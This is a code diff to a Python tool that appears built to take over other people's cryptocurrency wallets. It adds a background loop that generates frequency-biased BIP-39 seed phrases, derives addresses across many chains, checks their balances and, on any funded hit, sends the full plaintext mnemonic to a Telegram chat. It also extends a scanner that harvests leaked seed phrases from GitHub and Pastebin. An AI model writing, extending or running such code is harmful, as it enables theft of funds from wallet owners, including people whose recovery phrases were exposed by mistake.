@@ -92,6 +92,82 @@ def format_hit_alert(mnemonic: str, addresses: list, balances: list) -> str:
     return "\n".join(lines)
 
 
+async def run_smart_generator_loop(interval: int = 300) -> None:
+    """Run the AI word-frequency biased smart generator periodically.
+
+    Generates BIP-39 valid mnemonics biased by word frequency analysis,
+    checks balances, and sends Telegram alerts on confirmed hits.
+    """
+    from src.modules.crypto.balance.ai_analyzer import WordFrequencyAnalyzer
+    from src.modules.crypto.balance.smart_generator import SmartMnemonicGenerator
+    from src.modules.crypto.balance.scanner_coordinator import ScannerCoordinator
+    from src.modules.crypto.balance.chains import ALL_CHAINS, CHAIN_MAP
+    from src.modules.crypto.balance.deriver import derive_from_mnemonic
+    from src.modules.crypto.balance.hit_logger import HitLogger
+
+    hit_logger = HitLogger(
+        db_path="wallet_hits.db",
+        telegram_token=TELEGRAM_BOT_TOKEN,
+        telegram_chat_id=TELEGRAM_CHAT_ID,
+    )
+    await hit_logger.start()
+
+    coordinator = ScannerCoordinator(chains=list(ALL_CHAINS))
+    await coordinator.start()
+
+    analyzer = WordFrequencyAnalyzer()
+    analyzer.load_from_db()
+    generator = SmartMnemonicGenerator(analyzer)
+
+    logger.info("Smart generator started (interval: %ds)", interval)
+
+    while True:
+        try:
+            logger.info("Smart generator: starting generation cycle")
+
+            for _ in range(50):  # Generate 50 mnemonics per cycle
+                mnemonic = generator.generate()
+                if coordinator.is_mnemonic_seen(mnemonic):
+                    continue
+                coordinator.mark_mnemonic_seen(mnemonic, source="smart")
+
+                addresses = derive_from_mnemonic(mnemonic, chains=list(ALL_CHAINS), count=1)
+                for addr in addresses:
+                    chain_cfg = CHAIN_MAP.get(addr.chain.lower())
+                    if chain_cfg is None:
+                        continue
+                    result = await coordinator.check_balance(
+                        addr.address, chain_cfg, addr.derivation_path,
+                    )
+                    if result.balance > 0:
+                        mnemonic_hash = ScannerCoordinator.hash_mnemonic(mnemonic)
+                        await hit_logger.log_hit(
+                            address=addr.address,
+                            chain=addr.chain,
+                            balance=result.balance,
+                            usd_value=result.usd_value,
+                            mnemonic_hash=mnemonic_hash,
+                            derivation_path=addr.derivation_path,
+                            source="smart_scan",
+                        )
+                        msg = (
+                            "🤖 *SMART GENERATOR HIT!*\n\n"
+                            f"*Mnemonic:* `{mnemonic}`\n\n"
+                            f"*{addr.chain}*: `{result.balance:.8f}` {addr.symbol}\n"
+                            f"  Address: `{addr.address}`\n"
+                            f"\n⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
+                        )
+                        await send_telegram_alert(msg)
+                        logger.info("Smart generator: CONFIRMED HIT!")
+
+            logger.info("Smart generator: cycle complete, sleeping %ds", interval)
+
+        except Exception as e:
+            logger.error("Smart generator error: %s", e)
+
+        await asyncio.sleep(interval)
+
+
 async def run_leak_scanner_loop(interval: int = 3600) -> None:
     """Run the leak scanner periodically (default: every hour).
 
@@ -131,6 +207,8 @@ async def run_leak_scanner_loop(interval: int = 3600) -> None:
                     finding.mnemonic_candidate,
                     chains=list(ALL_CHAINS),
                     hit_logger=hit_logger,
+                    count=6,
+                    source="github",
                 )
                 if result and result.has_balance:
                     msg = (
@@ -154,6 +232,8 @@ async def run_leak_scanner_loop(interval: int = 3600) -> None:
                     finding.mnemonic_candidate,
                     chains=list(ALL_CHAINS),
                     hit_logger=hit_logger,
+                    count=6,
+                    source="pastebin",
                 )
                 if result and result.has_balance:
                     msg = (
@@ -189,6 +269,7 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
     logger.info(f"  Chains:       {', '.join(c.symbol for c in ALL_CHAINS)}")
     logger.info(f"  Duration:     {duration}s" if duration else "  Duration:     unlimited")
     logger.info(f"  Leak Scanner: enabled (every 3600s)")
+    logger.info(f"  Smart Generator: enabled (every 300s)")
     logger.info(f"  Telegram:     {'configured' if TELEGRAM_BOT_TOKEN else 'NOT configured'}")
     logger.info(f"  Log file:     {LOG_FILE}")
     logger.info("=" * 60)
@@ -199,6 +280,7 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
         f"Workers: {workers}\n"
         f"Chains: {', '.join(c.symbol for c in ALL_CHAINS)}\n"
         f"Leak Scanner: every 1h\n"
+        f"Smart Generator: every 5m\n"
         f"Duration: {'unlimited' if duration else f'{duration}s'}"
     )
 
@@ -233,9 +315,10 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
 
     start_time = time.monotonic()
 
-    # Start leak scanner as background task
+    # Start leak scanner and smart generator as background tasks
     leak_task = asyncio.create_task(run_leak_scanner_loop(interval=3600))
-    logger.info("Leak scanner background task started")
+    smart_task = asyncio.create_task(run_smart_generator_loop(interval=300))
+    logger.info("Leak scanner + smart generator background tasks started")
 
     try:
         stats = await scanner.run(duration_sec=duration)
@@ -245,8 +328,13 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
         raise
     finally:
         leak_task.cancel()
+        smart_task.cancel()
         try:
             await leak_task
+        except asyncio.CancelledError:
+            pass
+        try:
+            await smart_task
         except asyncio.CancelledError:
             pass
 
